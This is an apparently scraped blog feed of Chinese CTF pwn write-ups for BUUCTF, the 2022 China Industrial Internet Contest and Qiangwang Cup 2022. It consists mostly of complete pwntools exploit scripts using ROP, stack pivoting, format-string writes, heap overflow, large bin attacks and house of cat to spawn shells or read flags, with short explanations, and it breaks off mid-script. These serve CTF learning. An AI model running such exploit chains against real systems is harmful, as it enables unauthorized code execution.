<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./checkin&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27814</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(io, &#x27;b* 0x4011E2&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">bss = elf.bss()+<span class="number">0x800</span></span><br><span class="line">read_ret = <span class="number">0x4011BF</span></span><br><span class="line">pop_rdi = <span class="number">0x401253</span></span><br><span class="line">pop_rbx_rbp_r12_15 = <span class="number">0x40124A</span>                   <span class="comment">#pop rbx rbp r12一直到r15</span></span><br><span class="line">pop_rbp = <span class="number">0x40113d</span></span><br><span class="line">leave_ret = <span class="number">0x4011e2</span></span><br><span class="line">setvbuf_got = elf.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> libc.sym[<span class="string">&#x27;puts&#x27;</span>] - libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>] &gt; <span class="number">0</span>:</span><br><span class="line">    offest = libc.sym[<span class="string">&#x27;puts&#x27;</span>] - libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment">#offest = libc.sym[&#x27;setvbuf&#x27;] - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line">    offest = <span class="number">0x100000000</span> + libc.sym[<span class="string">&#x27;puts&#x27;</span>] - libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line"><span class="comment">#add [rbp-0x3d], rbx; ret</span></span><br><span class="line">magic_addr = <span class="number">0x40113c</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#stack pivot and read ropchain to bss</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa0</span> + p64(bss + <span class="number">0xa0</span>) + p64(read_ret)</span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">payload2 =  p64(pop_rbx_rbp_r12_15) + p64(offest) + p64(elf.got[<span class="string">&#x27;setvbuf&#x27;</span>] + <span class="number">0x3d</span>) + p64(<span class="number">0</span>)*<span class="number">4</span> + p64(magic_addr) + p64(ret)</span><br><span class="line">payload2 += p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;setvbuf&#x27;</span>]) + p64(pop_rbp) + p64(bss + <span class="number">0xa0</span>) + p64(read_ret)</span><br><span class="line">payload2 = payload2.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += p64(bss - <span class="number">8</span>) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload2)</span><br><span class="line">read = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libcbase = read - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sys_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh = libcbase + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">payload3 = p64(pop_rdi) + p64(sh) + p64(sys_addr)</span><br><span class="line">io.send(payload3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>中国工业互联网大赛-pwn</title>
    <url>/2022/09/25/%E4%B8%AD%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%A4%A7%E8%B5%9B-pwn/</url>
    <content><![CDATA[<p>中国工业互联网大赛-pwn</p>
<span id="more"></span>

<h1 id="究极输出"><a href="#究极输出" class="headerlink" title="究极输出"></a>究极输出</h1><p>bss段格式化字符串，找两条链子打printf@got</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">ip = <span class="string">&#x27;39.105.99.40&#x27;</span></span><br><span class="line">port = <span class="number">35099</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;HELLO?PWN IT!!!&#x27;</span>, <span class="string">b&#x27;%9$p%6$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libcbase = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x20840</span></span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&#x27;libcbase&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((stack + <span class="number">0xb0</span>) &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%10$hn&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;HELLO?PWN IT!!!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;gdb.attach(io, &#x27;b* 0x4011C7&#x27;)</span></span><br><span class="line"><span class="string">pause()&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x3390</span>).encode() + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%37$hn&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;HELLO?PWN IT!!!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;sys_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((stack + <span class="number">0x40</span>) &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%25$hn&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;HELLO?PWN IT!!!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x3392</span>).encode() + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%39$hn&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;HELLO?PWN IT!!!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(sys_addr &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>).encode() + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%16$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((sys_addr &amp; <span class="number">0xffff</span>) - (sys_addr &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>)).encode() + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%30$hn&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;HELLO?PWN IT!!!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;gdb.attach(io, &#x27;b* 0x4011c7&#x27;)</span></span><br><span class="line"><span class="string">pause()&#x27;&#x27;&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;HELLO?PWN IT!!!&#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="humidCtr"><a href="#humidCtr" class="headerlink" title="humidCtr"></a>humidCtr</h1><p>http pwn，把输入格式逆完之后就是一个随机数绕过 + 简单的堆溢出打free_hook</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28834</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, con = <span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    sa(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;POST / HTTP/1.1\r\n&#x27;</span> + p8(<span class="number">1</span>) + <span class="string">b&#x27;&amp;&#x27;</span> + <span class="built_in">str</span>(idx).encode() + <span class="string">b&#x27;&amp;&#x27;</span> + <span class="built_in">str</span>(size).encode() + <span class="string">b&#x27;&amp;&#x27;</span> + con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;POST / HTTP/1.1\r\n&#x27;</span> + p8(<span class="number">3</span>) + <span class="string">b&#x27;&amp;&#x27;</span> + <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;POST / HTTP/1.1\r\n&#x27;</span> + p8(<span class="number">4</span>) + <span class="string">b&#x27;&amp;&#x27;</span> + <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sa(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;POST / HTTP/1.1\r\n&#x27;</span> + p8(<span class="number">2</span>) + <span class="string">b&#x27;&amp;&#x27;</span> + <span class="built_in">str</span>(idx).encode() + <span class="string">b&#x27;&amp;&#x27;</span> + con)</span><br><span class="line"></span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line">result = libc.rand()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;DEV / HTTP/1.1\r\n&#x27;</span> + p32(result) + <span class="string">b&#x27;auth&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x30</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">libcbase = uu64() - <span class="number">0x1ecb61</span></span><br><span class="line">free_hook = libcbase + <span class="number">0x1eee48</span></span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + <span class="number">0x52290</span></span><br><span class="line">lg(<span class="string">&#x27;libcbase&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x30</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(free_hook))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x30</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x30</span>, p64(sys_addr))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>中国工业互联网大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯2022pwn题复现</title>
    <url>/2022/08/13/%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>强网杯2022部分pwn题复现</p>
<span id="more"></span>

<h1 id="devnull"><a href="#devnull" class="headerlink" title="devnull"></a>devnull</h1><p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100922388.png"></p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100922007.png" alt="QQ截图20220813110725"></p>
<p>一开始fgets读入可以使fd为0，后面的read就是我们标准输入的了，第一次read用于栈迁移，第二次用于读入我们的payload</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100922756.png"></p>
<p>可以看到是没有可执行权限的，不过程序有mprotect，可以用来改权限</p>
<p>接下来就是参数的问题了，rdx在最后输出thanks\n之后刚好为7</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100922569.png"></p>
<p>找到这段gadget可以控制rsi，而rdi可以由rax控制，接下来去找可以控制rax的gadget</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100922810.png"></p>
<p>通过ROPgadget找到如下gadget，把rbp溢出为一段可写的地址即可</p>
<p>需要注意的是程序关闭的标准输出流，我们可以使用命令<code>exec 1&gt;&amp;2</code>来将标准输出和标准错误给绑定到一起</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./devnull&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28834</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fd -&gt; 0</span></span><br><span class="line">sa(<span class="string">b&#x27;please input your filename&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">write_able = <span class="number">0x3fc000</span> + <span class="number">0x1000</span></span><br><span class="line">leave_ret = <span class="number">0x401354</span></span><br><span class="line">mprotect = <span class="number">0x4012D0</span>     <span class="comment"># mov esi, 0x1000; mov rdi, rax; call _mprotect; nop; pop rbp; ret</span></span><br><span class="line">magic = <span class="number">0x401350</span>        <span class="comment">#mov rax, rbp - 0x18;leave_ret</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;gdb.attach(io, &#x27;b* 0x401463&#x27;)</span></span><br><span class="line"><span class="string">pause()&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p64(write_able) + p64(write_able + <span class="number">0x18</span>) + p64(magic)</span><br><span class="line">sa(<span class="string">b&#x27;Please write the data you want to discard&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(write_able) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">3</span> + p64(mprotect) + p64(<span class="number">0</span>) + p64(write_able + <span class="number">0x38</span>) + asm(shellcraft.execve(write_able + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">sa(<span class="string">b&#x27;please input your new data&#x27;</span>, payload)</span><br><span class="line">sl(<span class="string">b&#x27;exec 1&gt;&amp;2&#x27;</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h1><p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100922393.png"></p>
<p>禁用了execve，程序会检查read的fd是否为0，这里可以先close(0)再open，这样flag的fd就为0了</p>
<p>只有两次edit的机会，删除堆块的时候指针未置0，uaf</p>
<p>利用思路：</p>
<ol>
<li>利用uaf泄露libc基址和堆地址</li>
<li>伪造_IO_FLE</li>
<li>第一次large bin attck打stderr</li>
<li>第二次large bin attack打top chunk size</li>
<li>触发__malloc_assert进入house of cat 的利用链</li>
<li>执行orw</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./house_of_cat&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28834</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&quot;mew mew mew~~~~~~&quot;</span>, <span class="string">b&quot;LOGIN | r00t QWBQWXF admin&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, con = <span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    sa(<span class="string">b&quot;mew mew mew~~~~~~&quot;</span>, <span class="string">b&quot;CAT | r00t QWBQWXF $\xff\xff\xff\xff&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sa(<span class="string">b&quot;mew mew mew~~~~~~&quot;</span>, <span class="string">b&quot;CAT | r00t QWBQWXF $\xff\xff\xff\xff&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;:\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sa(<span class="string">b&quot;mew mew mew~~~~~~&quot;</span>, <span class="string">b&quot;CAT | r00t QWBQWXF $\xff\xff\xff\xff&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;:\n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sa(<span class="string">b&quot;mew mew mew~~~~~~&quot;</span>, <span class="string">b&quot;CAT | r00t QWBQWXF $\xff\xff\xff\xff&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;:\n&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x418</span>, <span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#0 -&gt; large bin</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x430</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libcbase = uu64() - <span class="number">0x21a0d0</span></span><br><span class="line">setcontext = libcbase + <span class="number">0x53A6D</span></span><br><span class="line">IO_wfile_jumps = libcbase + <span class="number">0x2160c0</span></span><br><span class="line">stderr = libcbase + <span class="number">0x21a860</span></span><br><span class="line">open_addr = libcbase + <span class="number">0x114690</span></span><br><span class="line">write_addr = libcbase + <span class="number">0x114a20</span></span><br><span class="line">read_addr = libcbase + <span class="number">0x114980</span></span><br><span class="line">close_addr = libcbase + <span class="number">0x115100</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;libcbase&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;setcontext&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;IO_wfile_jumps&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;stderr&#x27;</span>)</span><br><span class="line">io.recv(<span class="number">10</span>)</span><br><span class="line">heapbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x290</span></span><br><span class="line">lg(<span class="string">&#x27;heapbase&#x27;</span>)</span><br><span class="line">flag_addr = heapbase + <span class="number">0x6d0</span></span><br><span class="line">lg(<span class="string">&#x27;flag_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = libcbase + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = libcbase + <span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12 = libcbase + <span class="number">0x11f497</span></span><br><span class="line">pop_rax = libcbase + <span class="number">0x45eb0</span></span><br><span class="line">ret = libcbase + <span class="number">0x29cd6</span></span><br><span class="line">syscall = libcbase + <span class="number">0x91396</span></span><br><span class="line"></span><br><span class="line">fake_io_addr = heapbase + <span class="number">0xae0</span>     <span class="comment">#2</span></span><br><span class="line">rop_addr = heapbase + <span 